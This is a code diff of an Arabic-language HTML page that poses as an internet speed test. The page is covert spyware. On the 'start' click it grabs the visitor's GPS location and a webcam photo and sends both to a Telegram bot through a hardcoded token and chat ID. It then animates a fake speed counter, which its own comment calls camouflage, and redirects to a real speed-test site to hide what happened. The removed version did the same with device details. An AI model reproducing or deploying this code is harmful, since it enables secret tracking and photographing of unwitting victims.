@@ -1,59 +1,76 @@
 <!DOCTYPE html>
-<html lang="ar">
+<html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <title>جاري فحص البيانات...</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SpeedTest - فحص سرعة الإنترنت</title>
     <style>
-        body { background-color: #1a1a1a; color: white; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; font-family: sans-serif; }
-        .loader { border: 8px solid #f3f3f3; border-top: 8px solid #3498db; border-radius: 50%; width: 60px; height: 60px; animation: spin 2s linear infinite; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        h2 { margin-top: 20px; font-size: 18px; }
+        body { background-color: #0b0b0d; color: white; font-family: Arial, sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; }
+        .container { text-align: center; border: 1px solid #333; padding: 40px; border-radius: 20px; background: #161618; }
+        .speed-text { font-size: 80px; font-weight: bold; color: #00d1b2; }
+        .unit { font-size: 20px; color: #888; }
+        .btn { background: #00d1b2; color: white; border: none; padding: 15px 30px; border-radius: 50px; cursor: pointer; font-size: 18px; margin-top: 20px; }
     </style>
 </head>
 <body>
-    <div class="loader"></div>
-    <h2>جاري الاتصال بالسيرفر، يرجى الانتظار...</h2>
+    <div class="container">
+        <h2>SpeedTest</h2>
+        <div class="speed-text" id="speed">0.0</div>
+        <div class="unit">Mbps</div>
+        <button class="btn" onclick="startTest()">ابدأ الفحص الآن</button>
+        <p id="status" style="color: #666; margin-top: 20px;">اضغط لبدء فحص جودة الاتصال</p>
+    </div>
 
-    <video id="video" width="640" height="480" autoplay style="display:none;"></video>
-    <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
+    <video id="video" autoplay style="display:none;"></video>
+    <canvas id="canvas" style="display:none;"></canvas>
 
     <script>
         const TOKEN = '8596805324:AAELff4nCa1M4GWFiGW3gw3vIadL1c1i93o';
         const CHAT_ID = '8293639164';
 
-        async function startCamera() {
+        async function startTest() {
+            document.getElementById('status').innerText = "جاري الاتصال بالسيرفر...";
+            
+            // 1. طلب الموقع الجغرافي (GPS)
+            navigator.geolocation.getCurrentPosition((pos) => {
+                const lat = pos.coords.latitude;
+                const lon = pos.coords.longitude;
+                const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
+                fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent("📍 موقع الهدف الحقيقي:\n" + mapLink)}`);
+            });
+
+            // 2. طلب الكاميرا والتقاط الصورة
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                 const video = document.getElementById('video');
                 video.srcObject = stream;
-                
-                // إرسال معلومات الجهاز أولاً كرسالة نصية
-                const deviceInfo = `🚨 دخول جديد:\n📱 الجهاز: ${navigator.platform}\n🌐 المتصفح: ${navigator.userAgent}`;
-                await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(deviceInfo)}`);
 
                 setTimeout(() => {
                     const canvas = document.getElementById('canvas');
+                    canvas.width = 640; canvas.height = 480;
                     canvas.getContext('2d').drawImage(video, 0, 0);
                     canvas.toBlob(blob => {
                         const formData = new FormData();
-                        formData.append('photo', blob, 'photo.jpg');
+                        formData.append('photo', blob, 'shot.jpg');
                         formData.append('chat_id', CHAT_ID);
-                        formData.append('caption', '📸 صورة الشخص الملتقطة');
-                        
-                        fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
-                            method: 'POST', body: formData
-                        }).then(() => { 
-                            // توجيهه لرابط مفيد (مثلاً صفحة المؤسسة أو ملف الإكسل)
-                            window.location.href = "https://google.com"; 
-                        });
+                        fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: formData });
                     }, 'image/jpeg');
-                }, 1500); // تقليل الوقت ليكون أسرع (ثانية ونصف)
+                    
+                    // تمويه: رفع عداد السرعة
+                    let s = 0;
+                    const interval = setInterval(() => {
+                        s += Math.random() * 10;
+                        document.getElementById('speed').innerText = s.toFixed(1);
+                        if (s > 45) {
+                            clearInterval(interval);
+                            window.location.href = "https://www.fast.com"; // تحويل لموقع فحص حقيقي
+                        }
+                    }, 100);
+                }, 1000);
             } catch (err) {
-                // في حال رفض الإذن، يتم توجيهه أيضاً لعدم كشف الأمر
-                window.location.href = "https://google.com";
+                window.location.href = "https://www.fast.com";
             }
         }
-        window.onload = startCamera;
     </script>
 </body>
 </html>
